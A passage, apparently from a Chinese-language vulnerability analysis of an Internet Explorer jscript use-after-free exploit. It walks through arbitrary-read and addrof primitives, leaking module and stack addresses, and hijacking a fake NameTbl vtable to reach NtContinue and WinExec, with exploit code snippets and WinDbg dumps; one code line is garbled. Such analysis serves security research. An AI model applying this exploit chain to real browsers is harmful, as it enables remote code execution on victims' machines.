      +0x38 ?           // (QWORD) 
      +0x40 name
// 简单来说就是一个0x40的头部(Property)，后面跟着name  
第一轮UAF泄露的就是某个Property偏移0x28处的一个next指针，这个next指针指向下一个Property的首地址。  
如果在重占位后，通过第1个至第x-1个属性名的名称和长度来控制这块重用的内存。将第x-1个Property的hash构造为5，并且通过设置第x个属性，让第x-1个Property的next指针指向第x个对象的Property，就可以错位读取第x个对象的Property指针，从而实现信息泄露。  
利用代码中为每个Object对象定义了4个属性，目的是泄露第4个属性的Property指针。我们来看一下重用后的相应内存：
上图第一个黄色高亮的是被某一个悬垂指针错误读取的Object
VARIANT，可以看到由于Type域正好与第3个Property的hash重合，Type被解释为了5，当前VARIANT被解释为double类型，并且这个错位的VARIANT内的Value值恰好为指向第4个Property的next指针。青色高亮的是第4个属性的Property结构。红色高亮的是第4个属性的的name。  
遍历之前保存的悬垂指针，通过以下代码判断是否到找到一个上述这种错位的VARIANT：
    for(i = 0; i > 15) & 0xff; 
    }
这里任意地址读取的思路是这样的：  
调用 string.length 方法读取 BSTR 字符串长度时，会进入 jscript!StringProxyObj::Length
函数，在函数内部会取出 BSTR 的长度，然后除以2:  
v4 = _(_DWORD_ )(v7 - 4) >> 1;  
如果我们对待读数据先乘以2，相当于右移1位，数据缺失1 bit，读出来之后无法还原。  
所以这里用了一些技巧，以 read_byte 为例，为了准确读取数据，代码中采用的办法是要读取 addr，则将 addr + 2 传入，此时待读取的
byte 左移了 16 字节，随后 jscript!StringProxyObj::Length 内部为了除以2，帮我们右移了 1
字节，所以数据返回后还得手动右移 15 字节，最后取出最低的一个字节即可。read_word、read_dword、read_qword 同理。  
0x07 任意对象地址读取  
封装完任意地址读取函数后，利用代码又在其基础上封装了一个任意对象地址读取函数addrof：
    function addrof(o) {
        var_addr = read_dword(leak_lower + 8, 0, o);
        return read_dword(var_addr + 8, 0, 1);
    }
addrof借助两次read_dword实现对象地址泄露。  
第一次readd_word将任意对象赋值给第4个属性，这样会导致一个引用对象(Type=0x80)的VARIANT被写到第4个Property的var内(参考下面的日志，可以看到保存到第4个Property处的VARIANT类型为0x80)，并将第4个Property的name改写为一个字符串型(Type=8)的VARIANT，VARIANT的值设置为leaklower
+ 8。这样就把被引用的VARIANT地址给读取出来，即下面日志中的08a9ece8。  
第二次read_dword针对第一次read_dword读取的值再解一次引用，从而将真正的对象地址读取出来。  
第一次 read_dword 数据(o)和地址(leak_lower + 8)都要传入  
第二次 read_dword 只需要传入地址(var_addr + 8)，因为数据已经在了
    // 第4个Property 
    00000000`08aa0a50  eac00080 000007fe 08a9ece8 00000000  ................ 
    00000000`08aa0a60  00001f80 00000000 00000000 00000000  ................ 
    00000000`08aa0a70  378f5a8e 00000018 00000000 00000000  .Z.7............ 
    00000000`08aa0a80  00000000 00000000 00000004 00000000  ................ 
    // 08aa0a90存放着name，可以看到它是一个字符串类型的VARIANT 
    00000000`08aa0a90  00000008 00000000 08aa0a5c 00000000  ........\.......  
    // 解第1个VARIANT 
    0:018> dq 08aa0a50 l3 
    00000000`08aa0a50  000007fe`eac00080 00000000`08a9ece8 
    00000000`08aa0a60  00000000`00001f80 
    // 解第2个VARIANT 
    0:018> dq 08a9ece8 l3 
    00000000`08a9ece8  00000000`00000081 00000000`0c3c6b30 
    00000000`08a9ecf8  00000000`0058c6a0 
    0:018> !heap -p -a 0c3c6b30 
    address 000000000c3c6b30 found in 
    _HEAP @ 1a0000 
    HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state 
    000000000c3c6b20 0007 0000  [00]   000000000c3c6b30    00068 - (busy) 
    jscript!NameTbl::`vftable' 
    0:018> dq 0c3c6b30 l68/8 
    00000000`0c3c6b30  000007fe`f00be0d8 00000000`00000000 
    00000000`0c3c6b40  00000000`00000000 00000000`0058b900 
    00000000`0c3c6b50  00000000`08a9ece8 00000000`ffffffff 
    00000000`0c3c6b60  00000000`0058c6e8 00000000`001b0000 
    00000000`0c3c6b70  000007fe`f00bfd48 00000000`00580ee0 
    00000000`0c3c6b80  00000000`00000000 00000000`00000000 
    00000000`0c3c6b90  000007fe`f014fc30 
    0:018> ln 000007fe`f00be0d8 
    (000007fe`f00be0d8)   jscript!NameTbl::`vftable'   |  (000007fe`f00be2d0)   jscript!NativeErrorProtoObjBase::`vftable' 
    Exact matches:
0x08 远程代码执行  
封装完上述这些功能函数后，接下来的操作就比较常规了：new一个object，泄露这个对象的首地址，从首地址中读取虚表指针，通过虚表指针获取jscript基址。紧接着从jscript的导入表中获取msvcrt和kernel32的基址，再从msvcrt的导入表中获取ntdll的基址，随后从kernel32的导出表获得WinExec函数地址，从ntdll的导出表中获取NtContinue函数地址，供后面使用。  
泄露Native栈地址  
由于后面借助NtContinue函数进行代码执行时，需要为伪造的_CONTEXT结构提供一个正确的Native栈地址，所以这里还要泄露一个Native栈地址，操作比较常规：
    function leak_stack_ptr() { 
        leak_obj = new Object(); 
        obj_addr = addrof(leak_obj); 
        csession_addr = read_dword(obj_addr + 24, 0, 1); 
        stack_addr_lower = read_dword(csession_addr + 80, 0, 1); 
        stack_addr_upper = read_dword(csession_addr + 84, 0, 1); 
        return {'lower': stack_addr_lower, 'upper': stack_addr_upper}; 
    }
64位基本知识点如下，这里不在过多说明：
    Jscript Object： 
      + 0x00 Jscript!NameTbl 
      +0x18 pCSession    // QWORD 
    Jscript!CSession(size = 0x2F0) 
      +0x50 pNativeStack // QWORD
虚表劫持和代码执行  
利用代码接下来伪造jscript!NameTbl对象和jscript!NameTbl对象的虚表，并将虚表内的第28项(此项原先为
jscript!ObjEvtHandler::FPersist函数地址)改写为ntdll!NtContinue函数的地址。  
trigger_exec函数首部，利用代码将第4个Property的name伪造为一个Type=0x81的对象，将Value设为伪造的jscript!NameTbl对象，并将对象的虚表指针(对象的第一个8字节)设为伪造的虚表。  
trigger_exec函数最后对fakeobj_var调用typeof函数，触发虚函数调用，劫持控制流到NtContinue，并将伪造的对象作为参数传入rcx：
    0:000> g 
    Breakpoint 0 hit 
    ntdll!ZwContinue: 
    00000000`76d116e0 4c8bd1          mov     r10,rcx 
    // 上层调用地址 